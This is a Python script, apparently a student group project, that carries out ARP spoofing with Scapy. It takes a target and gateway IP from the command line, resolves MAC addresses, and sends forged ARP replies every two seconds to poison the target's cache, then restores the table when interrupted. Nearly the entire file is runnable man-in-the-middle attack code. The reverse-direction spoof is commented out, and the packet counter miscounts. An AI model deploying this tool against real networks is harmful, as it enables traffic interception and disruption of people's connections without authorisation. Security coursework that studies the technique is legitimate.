# Spoofing Program Final Group Project
# Project Group Set 3 - Caban Hernandez, Craine, Hutchinson, Thota

# imported os to allow python to have os dependent functionality
import os
# Imported Scapy for spoofing functions
import scapy.all as scapy
# Imported argparse for writing simple command line interface
import argparse
# Imported time for various time-related functions, such as sleep
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    # documentation must make clear that program must run with arguments.
    parser.add_argument("-t", "--target", dest="target", help="used for setting the target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="used for setting the spoofed gateway IP address")
    return parser.parse_args()
# get_mac function required for getting MAC address of a network device
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target, gateway):
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), psrc=gateway)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    #source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip) # removed hwsrc = source_mac
    scapy.send(packet, verbose = False)

def main():
    arguments = get_arguments()
    target = arguments.target
    gateway = arguments.gateway
    #gateway = scapy.conf.route.route("0.0.0.0")[2]
    """
    print(f"The target is {target}")
    print(f"The gateway is {gateway}")
    """
    try:
        sent_packets_count = 0
        while True:
            spoof(target, gateway)
            #spoof(gateway, target)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end = "")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(target, gateway)
        #restore(gateway, target)
# not sure what is the point of this conditional
if __name__ == '__main__':
    print("Hello, world!")
    main()